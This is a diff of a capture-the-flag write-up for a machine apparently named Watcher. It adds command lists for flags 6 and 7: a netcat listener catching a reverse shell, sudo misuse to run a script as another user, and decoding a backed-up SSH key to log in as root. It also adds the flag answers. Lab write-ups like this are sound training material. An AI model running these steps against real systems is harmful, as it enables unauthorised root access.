@@ -71,32 +71,30 @@ Flag 5
 FLAG{live_by_the_cow_die_by_the_cow}
 ```
 Flag 6
-find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null
-cat /home/mat/note.txt
-sudo -l
-cat /home/mat/scripts/will_script.py
-cat cmd.py
-
-vim cmd.py
-      
+* ```find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null``
+* ```cat /home/mat/note.txt```
+* ```sudo -l```
+* ```cat /home/mat/scripts/will_script.py```
+* ```cat cmd.py```
+* ##### ```nano```[cmd.py](./Watcher/cmd.py)  
 * ```sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1```
 * ```nc -nlvp 5555```
 * ```python3 -c "import pty;pty.spawn('/bin/bash')"```
 * ```id```
 * ```cd /home/will```
 * ```cat flag_6.txt```
-Flag 7
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
-* ```
 ```
+FLAG{but_i_thought_my_script_was_secure}
+```
+Flag 7
+* ```find / -type f -name flag_7.txt -exec ls -l {} + 2>/dev/null```
+* ```id```
+* ```find / -type f -group adm -exec ls -l {} + 2>/dev/null```
+* ```cat /opt/backups/key.b64 | base64 -d > /home/will/ssh.key```
+* ```chmod 600 ssh.key```
+* ```ssh -i ssh.key root@<IP>```
+* ```cd root```
+* ```cat flag_7.txt```
+```
+FLAG{who_watches_the_watchers}
 ```
